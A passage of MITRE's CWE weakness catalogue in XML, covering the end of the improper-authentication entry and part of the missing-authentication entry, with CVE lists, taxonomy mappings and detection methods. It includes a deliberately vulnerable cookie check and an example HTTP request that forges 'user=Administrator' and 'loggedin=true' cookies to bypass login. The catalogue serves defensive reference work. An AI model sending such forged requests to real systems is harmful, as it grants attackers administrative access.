                     <xhtml:br/>if ($q-&gt;cookie('user') eq "Administrator") {<xhtml:div style="margin-left:1em;">DoAdministratorTasks();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<xhtml:br/>Cookie: user=Administrator<xhtml:br/>Cookie: loggedin=true<xhtml:br/>
                     <xhtml:br/>[body of request]</xhtml:div>
               </Example_Code>
               <Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the user cookie, the attacker also gains privileges to administer the software.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-117">
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>
               <References>
                  <Reference External_Reference_ID="REF-236"/>
               </References>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors did not use any authentication or used client-side authentication for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
		   <Observed_Example>
			 <Reference>CVE-2022-35248</Reference>
			 <Description>Chat application skips validation when Central Authentication Service
			 (CAS) is enabled, effectively removing the second factor from
			 two-factor authentication</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2022-35248</Link>
		   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-36436</Reference>
               <Description>Python-based authentication proxy does not enforce password authentication during the initial handshake, allowing the client to bypass authentication by specifying a 'None' authentication type.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36436</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30034</Reference>
               <Description>Chain: Web UI for a Python RPC framework does not use regex anchors to validate user login emails (CWE-777), potentially allowing bypass of OAuth (CWE-1390).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29951</Reference>
               <Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29952</Reference>
               <Description>Condition Monitor uses a protocol that does not require authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30313</Reference>
               <Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30317</Reference>
               <Description>Distributed Control System (DCS) uses a protocol that has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-33139</Reference>
               <Description>SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-33139</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-3116</Reference>
               <Description>Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an  incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-3116</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-35033</Reference>
			  <Description>Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-35033</Link>
			</Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2020-10263</Reference>
			  <Description>Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2020-10263</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-35395</Reference>
               <Description>Stack-based buffer overflows in SFK for wifi chipset used for IoT/embedded devices, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-35395</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-34523</Reference>
               <Description>Mail server does not properly check an access token before executing a Powershell command, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-34523</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-12812</Reference>
               <Description>Chain: user is not prompted for a second authentication factor (CWE-287) when changing the case of their username (CWE-178), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-12812</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-10148</Reference>
               <Description>Authentication bypass by appending specific parameters and values to a URI, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10148</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0688</Reference>
               <Description>Mail server does not generate a unique key during installation, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0688</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-14623</Reference>
               <Description>LDAP Go package allows authentication bypass using an empty password, causing an unauthenticated LDAP bind</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-14623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3421</Reference>
               <Description>login script for guestbook allows bypassing authentication by setting a "login_ok" parameter to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2382</Reference>
               <Description>admin script allows authentication bypass by setting a cookie value to "LOGGEDIN".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2382</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1048</Reference>
               <Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1048</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>product uses default "Allow" action, instead of default deny, leading to authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2168</Reference>
               <Description>chain: redirect without exit (CWE-698) leads to resultant authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3107</Reference>
               <Description>product does not restrict access to a listening port for a critical service, allowing authentication to be bypassed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3107</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1596</Reference>
               <Description>product does not properly implement a security-related configuration setting, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1596</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2422</Reference>
               <Description>authentication routine returns "nil" instead of "false" in some situations, allowing authentication bypass using an invalid username.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2422</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3232</Reference>
               <Description>authentication update script does not properly handle when admin does not select any authentication modules, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3232</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3231</Reference>
               <Description>use of LDAP authentication with anonymous binds causes empty password to result in successful authentication</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3231</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Authentication</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Error</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>1</Entry_ID>
               <Entry_Name>Insufficient Authentication</Entry_Name>
            </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.2</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.2</Entry_Name>
           </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="114"/>
            <Related_Attack_Pattern CAPEC_ID="115"/>
            <Related_Attack_Pattern CAPEC_ID="151"/>
            <Related_Attack_Pattern CAPEC_ID="194"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="57"/>
            <Related_Attack_Pattern CAPEC_ID="593"/>
            <Related_Attack_Pattern CAPEC_ID="633"/>
            <Related_Attack_Pattern CAPEC_ID="650"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-236"/>
            <Reference External_Reference_ID="REF-237"/>
            <Reference External_Reference_ID="REF-238"/>
            <Reference External_Reference_ID="REF-239"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authentication&#34; Page 109"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry might be misused when lower-level CWE entries are likely to be applicable. It is a level-1 Class (i.e., a child of a Pillar).</Rationale>
            <Comments>Consider children or descendants, beginning with CWE-1390: Weak Authentication or CWE-306: Missing Authentication for Critical Function.</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
			<Suggestions>
			  <Suggestion CWE_ID="1390" Comment="Weak Authentication"/>
			  <Suggestion CWE_ID="306" Comment="Missing Authentication for Critical Function"/>
			</Suggestions>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This can be resultant from SQL injection vulnerabilities and other issues.</Note>
			<Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Observed_Examples, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Authentication Issues</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Authentication</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="306" Name="Missing Authentication for Critical Function" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.</Description>
	 <Extended_Description>
	   <xhtml:p>As data is migrated to the cloud, if access does not require authentication, it can be easier for attackers to access the data from anywhere on the Internet.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Other</Impact>
               <Note>Exposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, access to administrative or other privileged functionality, or possibly even execution of arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.2">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-6.1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
